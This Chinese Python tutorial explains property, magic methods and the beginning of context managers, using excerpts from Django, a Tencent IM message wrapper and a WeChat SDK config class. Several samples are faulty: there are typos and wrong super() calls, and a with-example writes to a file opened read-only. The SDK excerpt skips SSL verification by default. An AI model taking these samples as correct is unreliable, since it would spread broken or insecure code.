去数据库中请求数据12345678910111213141516171819202122# ######## 定义 ########class Pager: def __init__(self, current_page): # 用户当前请求的页码（第一页、第二页...） self.current_page = current_page # 每页默认显示10条数据 self.per_items = 10 @property def start(self): val = (self.current_page - 1) * self.per_items return val @property def end(self): val = self.current_page * self.per_items return val# ######## 调用 ########p = Pager(1)p.start # 就是起始值，即：mp.end # 就是结束值，即：n从上述可见Python的property属性的功能是：property属性内部进行一系列的逻辑计算，最终将计算结果返回。3. property属性的有两种方式装饰器 即：在方法上应用装饰器类属性 即：在类中定义值为property对象的类属性3.1 装饰器方式在类的实例方法上应用@property装饰器Python中的类有经典类和新式类，新式类的属性比经典类的属性丰富。（ 如果类继object，那么该类是新式类 ）3.1.1经典类，具有一种@property装饰器1234567891011########## 定义 ######## class Goods: @property def price(self): return "laowang"########## 调用 ########obj = Goods()result = obj.price # 自动执行 @property 修饰的 price 方法，并获取方法的返回值print(result)3.1.2 新式类，具有三种@property装饰器1234567891011121314151617181920212223#coding=utf-8# ######## 定义 ########class Goods: """python3中默认继承object类 以python2、3执行此程序的结果不同，因为只有在python3中才有@xxx.setter @xxx.deleter """ @property def price(self): print('@property') @price.setter def price(self, value): print('@price.setter') @price.deleter def price(self): print('@price.deleter')# ######## 调用 ########obj = Goods()obj.price # 自动执行 @property 修饰的 price 方法，并获取方法的返回值obj.price = 123 # 自动执行 @price.setter 修饰的 price 方法，并将 123 赋值给方法的参数del obj.price # 自动执行 @price.deleter 修饰的 price 方法注意经典类中的属性只有一种访问方式，其对应被 @property 修饰的方法新式类中的属性有三种访问方式，并分别对应了三个被@property、@方法名.setter、@方法名.deleter修饰的方法由于新式类中具有三种访问方式，我们可以根据它们几个属性的访问特点，分别将三个方法定义为对同一个属性：获取、修改、删除1234567891011121314151617181920212223242526class Goods(object): def __init__(self): # 原价 self.original_price = 100 # 折扣 self.discount = 0.8 @property def price(self): # 实际价格 = 原价 * 折扣 new_price = self.original_price * self.discount return new_price @price.setter def price(self, value): self.original_price = value @price.deleter def price(self): del self.original_priceobj = Goods()obj.price # 获取商品价格obj.price = 200 # 修改商品原价del obj.price # 删除商品原价3.2 类属性方式当使用类属性的方式创建property属性时，经典类和新式类无区别123456789class Foo: def get_bar(self): return 'laowang' BAR = property(get_bar)obj = Foo()reuslt = obj.BAR # 自动调用get_bar方法，并获取方法的返回值print(reuslt)property方法中有个四个参数第一个参数是方法名，调用 对象.属性 时自动触发执行方法第二个参数是方法名，调用 对象.属性 ＝ XXX 时自动触发执行方法第三个参数是方法名，调用 del 对象.属性 时自动触发执行方法第四个参数是字符串，调用 对象.属性.doc ，此参数是该属性的描述信息123456789101112131415161718192021222324#coding=utf-8class Foo(object): def get_bar(self): print("getter...") return 'laowang' def set_bar(self, value): """必须两个参数""" print("setter...") return 'set value' + value def del_bar(self): print("deleter...") return 'laowang' BAR = property(get_bar, set_bar, del_bar, "description...")obj = Foo()obj.BAR # 自动调用第一个参数中定义的方法：get_barobj.BAR = "alex" # 自动调用第二个参数中定义的方法：set_bar方法，并将“alex”当作参数传入desc = Foo.BAR.__doc__ # 自动获取第四个参数中设置的值：description...print(desc)del obj.BAR # 自动调用第三个参数中定义的方法：del_bar方法由于类属性方式创建property属性具有3种访问方式，我们可以根据它们几个属性的访问特点，分别将三个方法定义为对同一个属性：获取、修改、删除12345678910111213141516171819202122232425class Goods(object): def __init__(self): # 原价 self.original_price = 100 # 折扣 self.discount = 0.8 def get_price(self): # 实际价格 = 原价 * 折扣 new_price = self.original_price * self.discount return new_price def set_price(self, value): self.original_price = value def del_price(self): del self.original_price PRICE = property(get_price, set_price, del_price, '价格属性描述...')obj = Goods()obj.PRICE # 获取商品价格obj.PRICE = 200 # 修改商品原价del obj.PRICE # 删除商品原价4. Django框架中应用了property属性（了解）WEB框架 Django 的视图中 request.POST 就是使用的类属性的方式创建的属性123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475class WSGIRequest(http.HttpRequest): def __init__(self, environ): script_name = get_script_name(environ) path_info = get_path_info(environ) if not path_info: # Sometimes PATH_INFO exists, but is empty (e.g. accessing # the SCRIPT_NAME URL without a trailing slash). We really need to # operate as if they'd requested '/'. Not amazingly nice to force # the path like this, but should be harmless. path_info = '/' self.environ = environ self.path_info = path_info self.path = '%s/%s' % (script_name.rstrip('/'), path_info.lstrip('/')) self.META = environ self.META['PATH_INFO'] = path_info self.META['SCRIPT_NAME'] = script_name self.method = environ['REQUEST_METHOD'].upper() _, content_params = cgi.parse_header(environ.get('CONTENT_TYPE', '')) if 'charset' in content_params: try: codecs.lookup(content_params['charset']) except LookupError: pass else: self.encoding = content_params['charset'] self._post_parse_error = False try: content_length = int(environ.get('CONTENT_LENGTH')) except (ValueError, TypeError): content_length = 0 self._stream = LimitedStream(self.environ['wsgi.input'], content_length) self._read_started = False self.resolver_match = None def _get_scheme(self): return self.environ.get('wsgi.url_scheme') def _get_request(self): warnings.warn('`request.REQUEST` is deprecated, use `request.GET` or ' '`request.POST` instead.', RemovedInDjango19Warning, 2) if not hasattr(self, '_request'): self._request = datastructures.MergeDict(self.POST, self.GET) return self._request @cached_property def GET(self): # The WSGI spec says 'QUERY_STRING' may be absent. raw_query_string = get_bytes_from_wsgi(self.environ, 'QUERY_STRING', '') return http.QueryDict(raw_query_string, encoding=self._encoding) # ######## 看这里看这里 ######## def _get_post(self): if not hasattr(self, '_post'): self._load_post_and_files() return self._post # ######## 看这里看这里 ######## def _set_post(self, post): self._post = post @cached_property def COOKIES(self): raw_cookie = get_str_from_wsgi(self.environ, 'HTTP_COOKIE', '') return http.parse_cookie(raw_cookie) def _get_files(self): if not hasattr(self, '_files'): self._load_post_and_files() return self._files # ######## 看这里看这里 ######## POST = property(_get_post, _set_post) FILES = property(_get_files) REQUEST = property(_get_request)5. 总结定义property属性共有两种方式，分别是【装饰器】和【类属性】，而【装饰器】方式针对经典类和新式类又有所不同。通过使用property属性，能够简化调用者在获取数据的流程property属性-应用1. 私有属性添加getter和setter方法123456789101112class Money(object): def __init__(self): self.__money = 0 def getMoney(self): return self.__money def setMoney(self, value): if isinstance(value, int): self.__money = value else: print("error:不是整型数字")2. 使用property升级getter和setter方法1234567891011121314151617181920class Money(object): def __init__(self): self.__money = 0 def getMoney(self): return self.__money def setMoney(self, value): if isinstance(value, int): self.__money = value else: print("error:不是整型数字") # 定义一个属性，当对这个money设置值时调用setMoney,当获取值时调用getMoney money = property(getMoney, setMoney) a = Money()a.money = 100 # 调用setMoney方法print(a.money) # 调用getMoney方法#1003. 使用property取代getter和setter方法重新实现一个属性的设置和读取方法,可做边界判定1234567891011121314151617181920class Money(object): def __init__(self): self.__money = 0 # 使用装饰器对money进行装饰，那么会自动添加一个叫money的属性，当调用获取money的值时，调用装饰的方法 @property def money(self): return self.__money # 使用装饰器对money进行装饰，当对money设置值时，调用装饰的方法 @money.setter def money(self, value): if isinstance(value, int): self.__money = value else: print("error:不是整型数字")a = Money()a.money = 100print(a.money)魔法属性无论人或事物往往都有不按套路出牌的情况，Python的类属性也是如此，存在着一些具有特殊含义的属性，详情如下：1. __doc__表示类的描述信息1234567class Foo: """ 描述类信息，这是用于看片的神奇 """ def func(self): passprint(Foo.__doc__)#输出：类的描述信息2. __module__ 和 __class____module__ 表示当前操作的对象在那个模块__class__ 表示当前操作的对象的类是什么123456789101112test.py# -*- coding:utf-8 -*-class Person(object): def __init__(self): self.name = &apos;laowang&apos;main.pyfrom test import Personobj = Person()print(obj.__module__) # 输出 test 即：输出模块print(obj.__class__) # 输出 test.Person 即：输出类3. __init__初始化方法，通过类创建对象时，自动触发执行1234567class Person: def __init__(self, name): self.name = name self.age = 18obj = Person('laowang') # 自动执行类中的 __init__ 方法4. __del__当对象在内存中被释放时，自动触发执行。注：此方法一般无须定义，因为Python是一门高级语言，程序员在使用时无需关心内存的分配和释放，因为此工作都是交给Python解释器来执行，所以，del的调用是由解释器在进行垃圾回收时自动触发执行的。123class Foo: def __del__(self): pass5. __call__对象后面加括号，触发执行。注：__init__方法的执行是由创建对象触发的，即：对象 = 类名() ；而对于__call__方法的执行是由对象后加括号触发的，即：对象() 或者 类()()12345678910class Foo: def __init__(self): pass def __call__(self, *args, **kwargs): print('__call__')obj = Foo() # 执行 __init__obj() # 执行 __call__6. __dict__类或对象中的所有属性类的实例属性属于对象；类中的类属性和方法等属于类，即：1234567891011121314151617181920212223class Province(object): country = 'China' def __init__(self, name, count): self.name = name self.count = count def func(self, *args, **kwargs): print('func')# 获取类的属性，即：类属性、方法、print(Province.__dict__)# 输出：&#123;'__dict__': &lt;attribute '__dict__' of 'Province' objects&gt;, '__module__': '__main__', 'country': 'China', '__doc__': None, '__weakref__': &lt;attribute '__weakref__' of 'Province' objects&gt;, 'func': &lt;function Province.func at 0x101897950&gt;, '__init__': &lt;function Province.__init__ at 0x1018978c8&gt;&#125;obj1 = Province('山东', 10000)print(obj1.__dict__)# 获取 对象obj1 的属性# 输出：&#123;'count': 10000, 'name': '山东'&#125;obj2 = Province('山西', 20000)print(obj2.__dict__)# 获取 对象obj1 的属性# 输出：&#123;'count': 20000, 'name': '山西'&#125;7. __str__如果一个类中定义了__str__方法，那么在打印 对象 时，默认输出该方法的返回值。12345678class Foo: def __str__(self): return 'laowang'obj = Foo()print(obj)# 输出：laowang8、__getitem__、__setitem__、__delitem__用于索引操作，如字典。以上分别表示获取、设置、删除数据12345678910111213141516171819# -*- coding:utf-8 -*-class Foo(object): def __getitem__(self, key): print('__getitem__', key) def __setitem__(self, key, value): print('__setitem__', key, value) def __delitem__(self, key): print('__delitem__', key)obj = Foo()result = obj['k1'] # 自动触发执行 __getitem__obj['k2'] = 'laowang' # 自动触发执行 __setitem__del obj['k1'] # 自动触发执行 __delitem__9、__getslice__、__setslice__、__delslice__该三个方法用于分片操作，如：列表123456789101112131415161718# -*- coding:utf-8 -*-class Foo(object): def __getslice__(self, i, j): print('__getslice__', i, j) def __setslice__(self, i, j, sequence): print('__setslice__', i, j) def __delslice__(self, i, j): print('__delslice__', i, j)obj = Foo()obj[-1:1] # 自动触发执行 __getslice__obj[0:1] = [11,22,33,44] # 自动触发执行 __setslice__del obj[0:2] # 自动触发执行 __delslice__面向对象设计继承 - 是基于Python中的属性查找(如X.name)多态 - 在X.method方法中，method的意义取决于X的类型封装 - 方法和运算符实现行为，数据隐藏默认是一种惯例参考实例腾讯即时通信模块,初级封装123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312#! /usr/bin/env python# coding: utf-8import randomimport timeclass Message(object): def __init__(self, msgarr=[], toacc=''): self.msgbody = msgarr # 此处为MsgDict对象实例的列表或者空列表 self.toacc = toacc # toacc为字符串(单发)或者列表(批量发) self.msgrandom = random.randint(1, 1000000000) self.msgrequest = &#123; 'To_Account': toacc, # 消息接收方账号 'MsgRandom': self.msgrandom, # 消息随机数，由随机函数产生 'MsgBody': [t.msg for t in msgarr] &#125; def del_option(self, option): if option in (set(self.msgrequest)-set(['To_Account', 'MsgRandom', 'MsgBody'])): self.__dict__.pop(option) self.msgrequest.pop(option) def append_msg(self, msg): self.msgbody.append(msg) self.msgrequest['MsgBody'].append(msg.msg) def insert_msg(self, index, msg): self.msgbody.insert(index, msg) self.msgrequest['MsgBody'].insert(msg.msg) def del_msg(self, index): if index in range(len(self.msgbody)): del self.msgbody[index] del sel.msgrequest['MsgBody'][index] def set_from(self, fromacc): # 指定消息的发送方，默认为服务器发送 self.fromacc = fromacc self.msgrequest['From_Account'] = fromacc def set_to(self, toacc): # 指定消息的接收方，可以为String(单发),可以为List(批量发送) self.toacc = toacc self.msgrequest['To_Account'] = toacc def refresh_random(self): self.msgrandom = random.randint(1, 1000000000) self.msgrequest['MsgRandom'] = self.msgrandom, # 消息随机数，由随机函数产生 def set_sync(self, sync): # 同步选项：1, 把消息同步到From_Account在线终端和漫游上 # 2, 消息不同步至From_Account # 若不填写，默认情况下会将消息同步 # 仅在单发单聊消息中可调用 self.sync = sync self.msgrequest['SyncOtherMachine'] = sync def set_timestamp(self): # 设置消息时间戳，unix时间, 仅在单发单聊消息中可以调用 self.timestamp = int(time.time()) self.msgrequest['MsgTimeStamp'] = self.timestamp def set_offlinepush(self, pushflag=0, desc='', ext='', sound=''): # 仅适用于APNa推送，不适用于安卓厂商推送 self.msgrequest['OfflinePushInfo'] = &#123; 'PushFlag': pushflag, 'Desc': desc, 'Ext': ext, 'Sound': sound &#125;class MsgDict(object): def __init__(self, msgtype='', msgcontent=&#123;&#125;): self.msgtype = msgtype self.msgcontent = msgcontent @property def msg(self): return &#123; 'MsgType': self.msgtype, 'MsgContent': self.msgcontent &#125; def set_content(self, content): self.msgcontent = contentclass TextMsg(MsgDict): def __init__(self, text='', msgtype='TIMTextElem'): self.text = text content = &#123;'Text': text&#125; super(TextMsg, self).__init__(msgtype=msgtype, msgcontent=content) def set_text(self, text): self.text = text self.msgcontent['Text'] = textclass LocationMsg(MsgDict): def __init__(self, desc='', latitude=0, longitude=0, msgtype='TIMLocationElem'): self.desc = desc self.latitude = latitude self.longitude = longitude content = &#123; 'Desc': desc, # 地理位置描述信息, String 'Latitude': latitude, # 纬度, Number 'Longitude': longitude # 经度, Number &#125; super(LocationMsg, self).__init__(msgtype=msgtype, msgcontent=content) def set_desc(self, desc): self.desc = desc self.msgcontent['Desc'] = desc def set_location(self, latitude, longitude): self.latitude = latitude self.longitude = longitude self.msgcontent['Latitude'] = latitude self.msgcontent['Longitude'] = longitude def set_latitude(self, latitude): self.latitude = latitude self.msgcontent['Latitude'] = latitude def set_longitude(self, longitude): self.longitude = longitude self.msgcontent['Longitude'] = longitudeclass FaceMsg(MsgDict): def __init__(self, index=1, data='', msgtype='TIMFaceElem'): self.index = index self.data = data content = &#123; 'Index': index, # 表情索引，用户自定义, Number 'Data': data # 额外数据, String &#125; super(TextMsg, self).__init__(msgtype=msgtype, msgcontent=content) def set_index(self, index): self.index = index self.msgcontent['Index'] = index def set_data(self, data): self.data = data self.msgcontent['Data'] = dataclass CustomMsg(MsgDict): def __init__(self, data='', desc='', ext='', sound='', msgtype='TIMCustomElem'): self.data = data self.desc = desc self.ext = ext self.sound = sound content = &#123; 'Data': data, # 自定义消息数据。不作为APNS的payload中字段下发，故从payload中无法获取Data字段, String 'Desc': desc, # 自定义消息描述，当接收方为iphone后台在线时，做ios离线Push时文本展示 'Ext': ext, # 扩展字段，当接收方为ios系统且应用处在后台时，此字段作为APNS请求包Payloads中的ext键值下发，Ext的协议格式由业务方确定，APNS只做透传 'Sound': sound # 自定义APNS推送铃声 &#125; super(CustomMsg, self).__init__(msgtype=msgtype, msgcontent=content) def set_data(self, data): self.data = data self.msgcontent['Data'] = data def set_desc(self, desc): self.desc = desc self.msgcontent['Desc'] = desc def set_ext(self, ext): self.ext = ext self.msgcontent['Ext'] = ext def set_sound(self, sound): self.sound = sound self.msgcontent['Sound'] = soundclass SoundMsg(MsgDict): def __init__(self, uuid='', size=0, second=0, msgtype='TIMSoundElem'): self.uuid = uuid self.size = size self.second = second content = &#123; 'UUID': uuid, # 语音序列号，后台用于索引语音的键值，String 'Size': size, # 语音数据大小, Number 'Second': second # 语音时长，单位秒 Number &#125; super(SoundMsg, self).__init__(msgtype=msgtype, msgcontent=content) def set_uuid(self, uuid): self.uuid = uuid self.msgcontent['UUID'] = uuid def set_size(self, size): self.size = size self.msgcontent['Size'] = size def set_second(self, second): self.second = second self.msgcontent['Second'] = secondclass ImageMsg(MsgDict): def __init__(self, uuid='', imgformat=0, imginfo=[], msgtype='TIMImageElem'): self.uuid = uuid self.imgformat = imgformat self.imginfo = imginfo content = &#123; 'UUID': uuid, # 图片序列号，后台用于索引语音的键值，String 'ImageFormat': imgformat, # 图片格式， BMP=1, JPG=2, GIF=3, 其他=0, Number 'ImageInfoArray': [t.info for t in imginfo] # 原图，缩略图或者大图下载信息, Array &#125; super(ImageMsg, self).__init__(msgtype=msgtype, msgcontent=content) def set_uuid(self, uuid): self.uuid = uuid self.msgcontent['UUID'] = uuid def set_format(self, imgformat): self.imgformat = imgformat self.msgcontent['ImageFormat'] = imgformat def append_info(self, info): # info 为ImageInfo对象实例 self.imginfo.append(info) self.msgcontnet['ImageInfoArray'].append(info.info) def insert_info(self, index, info): self.imginfo.insert(index, info) self.msgcontent['ImageInfoArray'].insert(index, info.info) def del_info(self, index): del self.imginfo[index] del self.msgcontent['ImageInfoArray'][index]class FileMsg(MsgDict): def __init__(self, uuid='', size=0, name='', msgtype='TIMFileElem'): self.uuid = uuid self.size = size self.name = name content = &#123; 'UUID': uuid, # 文件序列号，后台用于索引语音的键值，String 'FileSize': size, # 文件数据大小, Number 'FileName': name # 文件名称/路径， String &#125; super(FileMsg, self).__init__(msgtype=msgtype, msgcontent=content) def set_uuid(self, uuid): self.uuid = uuid self.msgcontent['UUID'] = UUID def set_size(self, size): self.size = size self.msgcontent['FileSize'] = size def set_name(self, name): self.name = name self.msgcontent['FileName'] = nameclass ImageInfo(object): def __init__(self, itype=1, size=0, width=0, height=0, url=''): #图片类型， 1-原图， 2-大图， 3-缩略图, 0-其他 self.itype = itype # 图片数据大小,Number self.size = size # 图片宽度,Number self.width = width # 图片高度, Number self.height = height # 图片下载地址,String self.url = url @property def info(self): return &#123; 'Type': self.itype, 'Size': self.size, 'Width': self.width, 'Height': self.height, 'URL': self.url &#125; def set_type(self, itype): self.itype = itype def set_size(self, size): self.size = size def set_width(self, width): self.width = width def set_height(self, height): self.height = height def set_url(self, url): self.url = url微信开发包，python实现, wechat_sdk开发1http://wechat-python-sdk.com/截取部分代码，学习类的设计123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293from __future__ import unicode_literalsimport timefrom wechat_sdk.lib.crypto import BasicCryptofrom wechat_sdk.lib.request import WechatRequestfrom wechat_sdk.exceptions import NeedParamErrorfrom wechat_sdk.utils import disable_urllib3_warningclass WechatConf(object): """ WechatConf 配置类 该类将会存储所有和微信开发相关的配置信息, 同时也会维护配置信息的有效性. """ def __init__(self, **kwargs): """ :param kwargs: 配置信息字典, 可用字典 key 值及对应解释如下: 'token': 微信 Token 'appid': App ID 'appsecret': App Secret 'encrypt_mode': 加解密模式 ('normal': 明文模式, 'compatible': 兼容模式, 'safe': 安全模式(默认)) 'encoding_aes_key': EncodingAESKey 值 (传入此值必须保证同时传入 token, appid, 否则抛出异常) 'access_token_getfunc': access token 获取函数 (用于单机及分布式环境下, 具体格式参见文档) 'access_token_setfunc': access token 写入函数 (用于单机及分布式环境下, 具体格式参见文档) 'access_token_refreshfunc': access token 刷新函数 (用于单机及分布式环境下, 具体格式参见文档) 'access_token': 直接导入的 access token 值, 该值需要在上一次该类实例化之后手动进行缓存并在此处传入, 如果不 传入, 将会在需要时自动重新获取 (传入 access_token_getfunc 和 access_token_setfunc 函数 后将会自动忽略此处的传入值) 'access_token_expires_at': 直接导入的 access token 的过期日期, 该值需要在上一次该类实例化之后手动进行缓存 并在此处传入, 如果不传入, 将会在需要时自动重新获取 (传入 access_token_getfunc 和 access_token_setfunc 函数后将会自动忽略此处的传入值) 'jsapi_ticket_getfunc': jsapi ticket 获取函数 (用于单机及分布式环境下, 具体格式参见文档) 'jsapi_ticket_setfunc': jsapi ticket 写入函数 (用于单机及分布式环境下, 具体格式参见文档) 'jsapi_ticket_refreshfunc': jsapi ticket 刷新函数 (用于单机及分布式环境下, 具体格式参见文档) 'jsapi_ticket': 直接导入的 jsapi ticket 值, 该值需要在上一次该类实例化之后手动进行缓存并在此处传入, 如果不 传入, 将会在需要时自动重新获取 (传入 jsapi_ticket_getfunc 和 jsapi_ticket_setfunc 函数 后将会自动忽略此处的传入值) 'jsapi_ticket_expires_at': 直接导入的 jsapi ticket 的过期日期, 该值需要在上一次该类实例化之后手动进行缓存 并在此处传入, 如果不传入, 将会在需要时自动重新获取 (传入 jsapi_ticket_getfunc 和 jsapi_ticket_setfunc 函数后将会自动忽略此处的传入值) 'partnerid': 财付通商户身份标识, 支付权限专用 'partnerkey': 财付通商户权限密钥 Key, 支付权限专用 'paysignkey': 商户签名密钥 Key, 支付权限专用 'checkssl': 是否检查 SSL, 默认不检查 (False), 可避免 urllib3 的 InsecurePlatformWarning 警告 :return: """ self.__request = WechatRequest() if kwargs.get('checkssl') is not True: disable_urllib3_warning() # 可解决 InsecurePlatformWarning 警告 self.__token = kwargs.get('token') self.__appid = kwargs.get('appid') self.__appsecret = kwargs.get('appsecret') self.__encrypt_mode = kwargs.get('encrypt_mode', 'safe') self.__encoding_aes_key = kwargs.get('encoding_aes_key') self.__crypto = None self._update_crypto() self.__access_token_getfunc = kwargs.get('access_token_getfunc') self.__access_token_setfunc = kwargs.get('access_token_setfunc') self.__access_token_refreshfunc = kwargs.get('access_token_refreshfunc') self.__access_token = kwargs.get('access_token') self.__access_token_expires_at = kwargs.get('access_token_expires_at') self.__jsapi_ticket_getfunc = kwargs.get('jsapi_ticket_getfunc') self.__jsapi_ticket_setfunc = kwargs.get('jsapi_ticket_setfunc') self.__jsapi_ticket_refreshfunc = kwargs.get('jsapi_ticket_refreshfunc') self.__jsapi_ticket = kwargs.get('jsapi_ticket') self.__jsapi_ticket_expires_at = kwargs.get('jsapi_ticket_expires_at') self.__partnerid = kwargs.get('partnerid') self.__partnerkey = kwargs.get('partnerkey') self.__paysignkey = kwargs.get('paysignkey') @property def token(self): """ 获取当前 Token """ self._check_token() return self.__token @token.setter def token(self, token): """ 设置当前 Token """ self.__token = token self._update_crypto() # 改动 Token 需要重新更新 Crypto @property def appid(self): """ 获取当前 App ID """ return self.__appid @property def appsecret(self): """ 获取当前 App Secret """ return self.__appsecret def set_appid_appsecret(self, appid, appsecret): """ 设置当前 App ID 及 App Secret""" self.__appid = appid self.__appsecret = appsecret self._update_crypto() # 改动 App ID 后需要重新更新 Crypto @property def encoding_aes_key(self): """ 获取当前 EncodingAESKey """ return self.__encoding_aes_key @encoding_aes_key.setter def encoding_aes_key(self, encoding_aes_key): """ 设置当前 EncodingAESKey """ self.__encoding_aes_key = encoding_aes_key self._update_crypto() # 改动 EncodingAESKey 需要重新更新 Crypto @property def encrypt_mode(self): return self.__encrypt_mode @encrypt_mode.setter def encrypt_mode(self, encrypt_mode): """ 设置当前加密模式 """ self.__encrypt_mode = encrypt_mode self._update_crypto() @property def crypto(self): """ 获取当前 Crypto 实例 """ return self.__crypto @property def access_token(self): """ 获取当前 access token 值, 本方法会自行维护 access token 有效性 """ self._check_appid_appsecret() if callable(self.__access_token_getfunc): self.__access_token, self.__access_token_expires_at = self.__access_token_getfunc() if self.__access_token: now = time.time() if self.__access_token_expires_at - now &gt; 60: return self.__access_token self.grant_access_token() # 从腾讯服务器获取 access token 并更新 return self.__access_token @property def jsapi_ticket(self): """ 获取当前 jsapi ticket 值, 本方法会自行维护 jsapi ticket 有效性 """ self._check_appid_appsecret() if callable(self.__jsapi_ticket_getfunc): self.__jsapi_ticket, self.__jsapi_ticket_expires_at = self.__jsapi_ticket_getfunc() if self.__jsapi_ticket: now = time.time() if self.__jsapi_ticket_expires_at - now &gt; 60: return self.__jsapi_ticket self.grant_jsapi_ticket() # 从腾讯服务器获取 jsapi ticket 并更新 return self.__jsapi_ticket @property def partnerid(self): """ 获取当前财付通商户身份标识 """ return self.__partnerid @property def partnerkey(self): """ 获取当前财付通商户权限密钥 Key """ return self.__partnerkey @property def paysignkey(self): """ 获取商户签名密钥 Key """ return self.__paysignkey def grant_access_token(self): """ 获取 access token 并更新当前配置 :return: 返回的 JSON 数据包 (传入 access_token_refreshfunc 参数后返回 None) """ self._check_appid_appsecret() if callable(self.__access_token_refreshfunc): self.__access_token, self.__access_token_expires_at = self.__access_token_refreshfunc() return response_json = self.__request.get( url="https://api.weixin.qq.com/cgi-bin/token", params=&#123; "grant_type": "client_credential", "appid": self.__appid, "secret": self.__appsecret, &#125;, access_token=self.__access_token ) self.__access_token = response_json['access_token'] self.__access_token_expires_at = int(time.time()) + response_json['expires_in'] if callable(self.__access_token_setfunc): self.__access_token_setfunc(self.__access_token, self.__access_token_expires_at) return response_json def grant_jsapi_ticket(self): """ 获取 jsapi ticket 并更新当前配置 :return: 返回的 JSON 数据包 (传入 jsapi_ticket_refreshfunc 参数后返回 None) """ self._check_appid_appsecret() if callable(self.__jsapi_ticket_refreshfunc): self.__jsapi_ticket, self.__jsapi_ticket_expires_at = self.__jsapi_ticket_refreshfunc() return response_json = self.__request.get( url="https://api.weixin.qq.com/cgi-bin/ticket/getticket", params=&#123; "type": "jsapi", &#125;, access_token=self.access_token, ) self.__jsapi_ticket = response_json['ticket'] self.__jsapi_ticket_expires_at = int(time.time()) + response_json['expires_in'] if callable(self.__jsapi_ticket_setfunc): self.__jsapi_ticket_setfunc(self.__jsapi_ticket, self.__jsapi_ticket_expires_at) return response_json def get_access_token(self): """ 获取 Access Token 及 Access Token 过期日期, 仅供缓存使用, 如果希望得到原生的 Access Token 请求数据请使用 :func:`grant_token` **仅为兼容 v0.6.0 以前版本使用, 自行维护 access_token 请使用 access_token_setfunc 和 access_token_getfunc 进行操作** :return: dict 对象, key 包括 `access_token` 及 `access_token_expires_at` """ self._check_appid_appsecret() return &#123; 'access_token': self.access_token, 'access_token_expires_at': self.__access_token_expires_at, &#125; def get_jsapi_ticket(self): """ 获取 Jsapi Ticket 及 Jsapi Ticket 过期日期, 仅供缓存使用, 如果希望得到原生的 Jsapi Ticket 请求数据请使用 :func:`grant_jsapi_ticket` **仅为兼容 v0.6.0 以前版本使用, 自行维护 jsapi_ticket 请使用 jsapi_ticket_setfunc 和 jsapi_ticket_getfunc 进行操作** :return: dict 对象, key 包括 `jsapi_ticket` 及 `jsapi_ticket_expires_at` """ self._check_appid_appsecret() return &#123; 'jsapi_ticket': self.jsapi_ticket, 'jsapi_ticket_expires_at': self.__jsapi_ticket_expires_at, &#125; def _check_token(self): """ 检查 Token 是否存在 :raises NeedParamError: Token 参数没有在初始化的时候提供 """ if not self.__token: raise NeedParamError('Please provide Token parameter in the construction of class.') def _check_appid_appsecret(self): """ 检查 AppID 和 AppSecret 是否存在 :raises NeedParamError: AppID 或 AppSecret 参数没有在初始化的时候完整提供 """ if not self.__appid or not self.__appsecret: raise NeedParamError('Please provide app_id and app_secret parameters in the construction of class.') def _update_crypto(self): """ 根据当前配置内容更新 Crypto 类 """ if self.__encrypt_mode in ['compatible', 'safe'] and self.__encoding_aes_key is not None: if self.__token is None or self.__appid is None: raise NeedParamError('Please provide token and appid parameters in the construction of class.') self.__crypto = BasicCrypto(self.__token, self.__encoding_aes_key, self.__appid) else: self.__crypto = None思维锻炼设计讲师和学生类，讲师有上课，备课等方法，学生有听课，做练习等方法，均有姓名、性别、年龄等基本属性设计聊天Message类with与“上下文管理器”如果你有阅读源码的习惯，可能会看到一些优秀的代码经常出现带有 “with” 关键字的语句，它通常用在什么场景呢？对于系统资源如文件、数据库连接、socket 而言，应用程序打开这些资源并执行完业务逻辑之后，必须做的一件事就是要关闭（断开）该资源。比如 Python 程序打开一个文件，往文件中写内容，写完之后，就要关闭该文件，否则会出现什么情况呢？极端情况下会出现 “Too many open files” 的错误，因为系统允许你打开的最大文件数量是有限的。同样，对于数据库，如果连接数过多而没有及时关闭的话，就可能会出现 “Can not connect to MySQL server Too many connections”，因为数据库连接是一种非常昂贵的资源，不可能无限制的被创建。来看看如何正确关闭一个文件。1. 普通版1234def m1(): f = open("output.txt", "w") f.write("python之禅") f.close()这样写有一个潜在的问题，如果在调用 write 的过程中，出现了异常进而导致后续代码无法继续执行，close 方法无法被正常调用，因此资源就会一直被该程序占用者释放。那么该如何改进代码呢？2. 进阶版12345678def m2(): f = open("output.txt", "w") try: f.write("python之禅") except IOError: print("oops error") finally: f.close()改良版本的程序是对可能发生异常的代码处进行 try 捕获，使用 try/finally 语句，该语句表示如果在 try 代码块中程序出现了异常，后续代码就不再执行，而直接跳转到 except 代码块。而无论如何，finally 块的代码最终都会被执行。因此，只要把 close 放在 finally 代码中，文件就一定会关闭。3. 高级版123def m3(): with open("output.txt", "r") as f: f.write("Python之禅")一种更加简洁、优雅的方式就是用 with 关键字。open 方法的返回值赋值给变量 f，当离开 with 代码块的时候，系统会自动调用 f.close() 方法， with 的作用和使用 try/finally 语句是一样的。那么它的实现原理是什么？在讲 with 的原理前要涉及到另外一个概念，就是上下文管理器（Context 